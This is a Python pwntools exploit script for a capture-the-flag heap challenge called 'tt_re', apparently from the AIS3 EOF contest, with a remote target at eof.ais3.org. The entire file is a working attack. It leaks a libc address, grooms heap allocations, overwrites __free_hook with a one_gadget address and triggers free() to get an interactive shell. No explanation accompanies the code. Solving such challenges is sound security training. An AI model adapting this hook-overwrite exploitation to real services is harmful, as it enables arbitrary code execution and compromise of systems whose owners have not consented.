from pwn import *
import time
import sys


def add(size):
    proc.sendlineafter(b':', b'1')
    proc.sendlineafter(b':', f'{size}'.encode())


def free(offset):
    proc.sendlineafter(b':', b'2')
    proc.sendlineafter(b':', f'{offset}'.encode())


def write(data):
    proc.sendlineafter(b':', b'3')
    proc.sendafter(b':', data)


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    proc.recvuntil(b':P ')
    printf = int(proc.recvline(), 16)
    libc = printf - 0x62830
    log.info('libc: ' + hex(libc))
    free_hook = libc + 0x1e75a8
    malloc_hook = libc + 0x1e4c30
    one_gadget = libc + 0x106ef8
    #one_gadget = libc + 0xe237f
    #libc2program = libc + 0x1eb5e0
    libc2program = libc + 0x1ef4e0
    magic_hook = libc + 0x1e40a8

    add(0x20d30)
    free(0x20d40)
    add(0x18)
    write(p64(free_hook)[:6])
    add(0x68)
    add(0x68)
    write(p64(one_gadget)[:6])
    free(0)
    return


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eof.ais3.org 10106'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./tt_re'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
